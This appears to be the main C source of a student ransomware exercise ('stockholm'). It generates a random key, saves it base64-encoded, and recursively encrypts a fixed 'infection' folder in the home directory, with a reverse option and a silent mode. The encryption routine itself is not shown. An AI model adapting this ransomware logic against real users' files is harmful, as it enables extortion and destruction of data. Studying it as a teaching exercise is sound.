#include "stockholm.h"

int	save_key(const unsigned char *key, const bool silent)
{
	int fd = open(SAVING_KEY_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0644);
	
	if (fd == -1)
		return (print_perror("Cannot save key in file", silent), -1);

	size_t enc_len;

    char *key_64 = base64_encode(key, KEY_SIZE, &enc_len);
	if (!key_64)
		return (close(fd), print_error("Cannot creat base64 key and save it", silent), 1);

	write(fd, key_64, enc_len);
	free(key_64);
	close(fd);
	return (0);
}

int	create_key(unsigned char *new_key, const bool silent)
{
	if (!RAND_bytes(new_key, KEY_SIZE))
		return (print_perror("Cannot create key", silent), -1);
	if (silent)
		return (0);
	size_t enc_len;

    char *key_64 = base64_encode(new_key, KEY_SIZE, &enc_len);
	if (!key_64)
		return (print_error("Cannot creat base64 key", silent), 1);
    printf("Key: %s\n", key_64);
	free(key_64);
	return (0);
}

int	get_key_in_file(unsigned char *key, const char *file, const bool silent)
{
	int file_fd = open(file, O_RDONLY);
	char encoded[44];
	size_t	len = 0;
	size_t	output_len = 0;

	if (file_fd == -1)
		return (print_error("Cannot open the saving key file", silent), 1);
	if ((len =  read(file_fd, encoded, 44)) != 44)
		return (close(file_fd), print_error("Key was not found in saving key file", silent),  1);
	
	unsigned char *decoded = base64_decode(encoded, len, &output_len);
	if (!decoded)
		return (print_error("Cannot decode base64 key", silent), 1);
	memcpy(key, decoded, KEY_SIZE);
	free(decoded);
	return (close(file_fd), 0);
}

char	*get_home()
{
	char *home_dir = NULL;

	home_dir = getenv("HOME");
	if (!home_dir)
	{
		struct passwd *pw = getpwuid(getuid());
		if (!pw)
			return (NULL);
		home_dir = pw->pw_dir;
	}
	return (home_dir);
}

int is_dir_exist(const char *path)
{
    struct stat st;

    if (stat(path, &st) == -1) {
        return -1;
    }
	if (S_ISDIR(st.st_mode))
    		return (0);
	return (-1);
}

int	find_folder(char *path_to_folder, const bool silent)
{
	const char *path_home = get_home();
	
	if (!path_home)
		return (print_error("Cannot find home directorie", silent), 1);
	
	if (snprintf(path_to_folder, PATH_MAX, "%s/%s", path_home, FOLDER) == -1)
		return (print_error("Concatenation path", silent), 1);
	
	if (is_dir_exist(path_to_folder) == -1)
		return (printf_error(silent, "Cannot find directorie %s\n", path_to_folder), 1);

	return (0);
}

void	help(const char *programme_name)
{
	printf("Usage: %s [-h] [-v] [-r KEY] [-f] [-s]\n", programme_name);
	printf("Crypte the directorie infection recursively !\n");
	printf("The key is save in the file %s\n\n", SAVING_KEY_FILE);
	printf("-h >> Help: display help menue\n");
	printf("-v >> version: show the current version of the programme\n");
	printf("-s >> silent: Suppress output to the terminal even error message\n");
	printf("-r >> reverse: reverse the encryption using the provided key\n");
	printf("-f >> file: change the -r option, take the name of the file where the key is stock\n");
}

int	check_arg(const int argc,  char *const *argv, unsigned char *key, bool *silent_mode, bool *is_key)
{
	int		opt;
	bool	use_file_for_r = 0;
	char	*arg = NULL;

	while ((opt = getopt(argc, argv, "hvr:sf")) != -1)
	{
		switch (opt)
		{
			case 'h':
				help(argv[0]);
				exit(0);
				break ;
			case 's':
				*silent_mode = 1;
				break ;
			case 'v':
				printf("%s\n", VERSION);
				exit(0);
				break ;
			case 'f':
				use_file_for_r = 1;
				break;
			case 'r':
				*is_key = 1;
				arg = optarg;
				break ;
			case '?':
				if (optopt == 'r')
					fprintf(stderr, "Option -%c requires an argument.\n", optopt);
				else if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
				else
					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				return (1);
			default:
				fprintf(stderr, "Invalid option\n");
				return (1); 
		}
	}
	if (*is_key && use_file_for_r)
		return (get_key_in_file(key, (const char *) arg, *silent_mode));
	else if (*is_key && !use_file_for_r)
	{
		size_t	output_len = 0;
		if (strlen(arg) != 44)
			return (print_error("Wrong key !", *silent_mode), 1);
		unsigned char *decoded = base64_decode(arg, strlen(arg), &output_len);
		if (!decoded)
			return (print_error("Cannot decode base64 key", *silent_mode), 1);
		memcpy(key, decoded, KEY_SIZE);
		free(decoded);
	}
	return (0);
}

int	main(int argc, char *argv[])
{
	char	path_to_folder[PATH_MAX + 1];
	unsigned char	key[32] = {0};
	bool	silent_mode = 0;
	bool	is_key = 0;

	if (check_arg(argc, argv, key, &silent_mode, &is_key))
		return (1);

	if (find_folder(path_to_folder, silent_mode))
		return (1);
	
	if (!is_key)
	{
		if (create_key(key, silent_mode) == -1)
			return (1);
		if (save_key(key, silent_mode) == -1)
			return (1);
		if (folder_cryptage(path_to_folder, key, silent_mode))
			return (1);
	}
	else
	{
		if (folder_decryptage(path_to_folder, key, silent_mode))
			return (1);
	}
	return (0);
}